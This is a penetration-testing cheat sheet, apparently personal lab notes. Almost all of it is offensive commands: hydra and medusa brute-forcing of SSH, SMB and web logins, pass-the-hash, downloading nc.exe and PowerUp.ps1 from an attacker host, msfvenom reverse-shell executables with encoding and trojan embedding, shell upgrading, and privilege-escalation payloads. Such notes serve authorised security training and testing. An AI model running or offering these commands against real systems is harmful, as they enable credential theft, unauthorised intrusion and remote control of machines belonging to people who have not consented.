## Password Cracking:
```
$john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt

$hydra -l <user> -p <pass> <ip> -t 4 ssh

PASS THE HASH:/usr/bin/pth-winexe -U administrator% //<ip> cmd

$hydra <ip> -l <user> -p <pass> http-get-form "/base-login.asp:txtLoginID=^USER^&txtPassword=^PASS^&cmdSubmit=Login:ACCESS DENIED" -t 64

$hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
	

$hydra -l user -P /usr/share/wordlists/metasploit/common_roots.txt <ip> smb

$medusa -h <ip> -u <user> -P password-file.txt -M http -m DIR:/admin -T 10
```

## Issues with session:

> killall -w openvpn

## FILE TRANSFER:
```
$tftp -i <ip> get nc.exe

Invoke-WebRequest "http://<ip>/PowerUp.ps1" -OutFile "C:~\PowerUp.ps1"'

powershell.exe -exec bypass

Import-Module .\PowerUp.ps1
```


## MSFVENOM: 
```
$msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

$msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o rev_shell.exe

$msfvenom -l payloads
```

## SHELL SPAWNING:
```
stty tab auto
python -c ‘import pty; pty.spawn("/bin/bash")’
python -c 'import pty;pty.spawn("/bin/bash");'
python -c 'import pty; pty.spawn("/bin/sh")'
```
## Prv esc reminders:

ALWAYS DO SUDO -L

linux payload:
> linux/x86/shell/reverse_tcp

windows payload: 
> windows/shell_reverse_tcp

upgrade to meterpreter payload
> post/multi/manage/shell_to_meterpreter


SEE WHATS RUNNING 

sudo lsof -i -P -n | grep LISTEN

## MISC

Compile linux exploits
> $i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c

Burpsuite url enoding is ctr-u

Gobuster location

> gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt



NIKTO:

> $nikto -host <ip>


FTP ANON:

> $python -m pyftpdlib -p 21 -w

SMB LOGIN:
```
smbclient //<ip>/"share"
Smbclient -L <ip>

Invoke-WebRequest -OutFile PowerUp.ps1 http://<ip>
```